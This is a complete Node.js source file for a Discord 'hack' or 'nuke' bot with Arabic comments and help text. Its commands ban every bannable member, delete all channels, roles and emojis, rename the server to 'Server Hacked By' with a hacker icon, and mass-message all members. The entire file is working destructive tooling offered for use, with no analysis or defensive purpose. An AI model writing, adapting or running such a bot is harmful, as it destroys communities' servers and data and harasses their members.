const express = require("express");
const app = express();

app.listen(() => console.log("HACKER BOT BY DarkGamerYT"));

app.use('/ping', (req, res) => {
  res.send(new Date());
});


const Discord = require('discord.js');
const client = new Discord.Client();
const ms = require("ms");
const guild = require('guild');



// لا تغير شي في هذا الا التوكن
//توكن بوتك
const config = {
"prefix" : "#",
"dmMessage" : "**Hi **",
"serverName" : "Server Hacked By ",
"iconURL" : "https://1.bp.blogspot.com/-LB7WRACcsNo/X25Xn1MvSsI/AAAAAAAAQck/VbtsMAt4aCE71UT4u4A_rxok0M0n3_-CwCLcBGAsYHQ/s1200/%25D9%2583%25D9%258A%25D9%2581%2B%25D8%25AA%25D8%25B5%25D8%25A8%25D8%25AD%2B%25D9%2587%25D9%2583%25D8%25B1%2B%25D9%2583%25D9%258A%25D9%2581%2B%25D8%25AA%25D9%2583%25D9%2588%25D9%2586%2B%25D9%2587%25D9%2583%25D8%25B1.jpeg",
"banReason" : "Banned by  hack bot | Get shit up",

}
 


client.on("ready", async () => {
console.log(`${client.user.username} is ready to nuke ;)\n Make sure you have written the config variable !!`)     
});



client.on("message", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith(`${config.prefix}nuke`)) {      
      
   message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
 message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.user.username}`)})
                                                                                     
})
   message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})
  })
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((e)=> {console.log(`DELETED ROLE: ${e.name}`)})
    })
   message.guild.emojis.cache.array().forEach(emoji => {emoji.delete().then((e)=> {console.log(`DELETED EMOJI: ${e.name}`)})
  })
   message.guild.setName(config.serverName)
   message.guild.setIcon(config.iconURL)
}
if (message.content.startsWith(`${config.prefix}dmall`)) {      
message.guild.members.cache.array().forEach(m => {m.send(config.dmMessage).then((m)=> {console.log(`MESSAGE SENT TO: ${m.user.username}`)})
})
}
if (message.content.startsWith(`${config.prefix}banall`)) {      
  message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
    message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.name}`)})
                                                                                        
   })  
  }
  if(message.content.startsWith(`${config.prefix}deleteall`)){
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((r)=>{
        console.log(`DELETED ROLE: ${r.name}`)
      })
    })
        message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})


        
      })
    }
  if(message.content.startsWith(`${config.prefix}ping`)){
    		         message.channel.send('Ping?').then(m => m.edit(`${m.createdTimestamp - message.createdTimestamp}ms`))

  }


    if(message.content.startsWith(`${config.prefix}help`)) {
     let p = config.prefix
     let embed = new Discord.MessageEmbed()
    .setTitle(`اوامر الهاك`)
    .addField(`${p}ping`,"لمعرفة بنق البوت")
    .addField(`${p}banall`,"لتبنيد الكل")
    .addField(`${p}deleteall`,"لحذف جميع الرومات والرتب")
    .addField(`${p}dmall`,"لارسال رسالة للكل")
    .addField(`${p}nuke`,"تبنيد الكل وحذف جميع الرتب والرومات وتغير اسم السيرفر والصورة (تدمير السيرفر)")
    .setFooter('bot hack by ...')
    message.member.send(embed)


      }
})



client.login(process.env.TOKEN);
